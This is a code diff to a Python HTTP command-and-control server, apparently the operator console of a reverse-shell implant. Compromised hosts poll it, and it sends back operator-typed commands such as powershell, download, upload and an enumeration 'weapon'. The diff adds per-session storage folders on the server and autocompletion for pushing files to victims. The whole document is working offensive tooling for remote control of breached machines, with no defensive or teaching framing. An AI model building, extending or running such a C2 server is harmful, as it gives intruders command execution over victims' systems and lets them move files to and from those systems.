@@ -1,15 +1,21 @@
 #!/usr/bin/python
 import BaseHTTPServer
 import readline
+import os
 
 HOST = '10.200.32.131'
 PORT = 80
 
+sessionid = None
 
 class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
 
     def do_GET(s):
-
+        global sessionid
+        sessionid = s.headers['Session-Id']
+        if not os.path.isdir('Storage/' + sessionid):
+            os.mkdir('Storage/' + sessionid)
+        setup_Readline()
         cmd = raw_input('{}{}\\>{} '.format(bcolors.OKGREEN, s.headers['Current-Location'], bcolors.ENDC))
         if cmd == 'exit':
             print('{}[!] Connection closed. Press ^C to shutdown the server.'.format(bcolors.WARNING))
@@ -34,13 +40,22 @@ class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
         return
 
 def autocomplete(text,state):
-    dictionary = ['download', 'exit', 'help', 'powershell', 'session', 'weapon']
-    w_dictionary = ['BasicEnum', 'foo1', 'foo2', 'foo3', 'foo4', 'foo5', 'foo6', 'foo7', 'foo8', 'foo9', 'foo10', 'foo11', 'foo12', 'foo13', 'foo14', 'foo15', 'foo16', 'foo17', 'foo18']
+    dictionary = ['download', 'exit', 'help', 'powershell', 'session', 'upload', 'weapon']
+    w_dictionary = ['BasicEnum']
 
     if text.startswith('weapon '):
         text = text[7:]
         results = [x for x in w_dictionary if x.startswith(text)] + [None]
         results[state] = 'weapon ' + results[state]
+    elif text.startswith('upload '):
+        text = text[7:]
+        # File dictionary generation
+        global sessionid
+        results = [x for x in os.walk("Storage/{}".format(sessionid))]
+        tmp_dictionary = ["{}/{}".format(x[0],y) for x in results for y in x[2]]
+
+        results = [x for x in tmp_dictionary if x.startswith("Storage/{}/".format(sessionid) + text)] + [None]
+        results[state] = 'upload ' + results[state][len("Storage/{}/".format(sessionid)):]
     else:
         results = [x for x in dictionary if x.startswith(text)] + [None]
     return results[state]
@@ -62,8 +77,6 @@ class bcolors:
 if __name__ == '__main__':
     server_class = BaseHTTPServer.HTTPServer
     httpd = server_class((HOST, PORT), Handler)
-
-    setup_Readline()
 
     try:
         httpd.serve_forever()
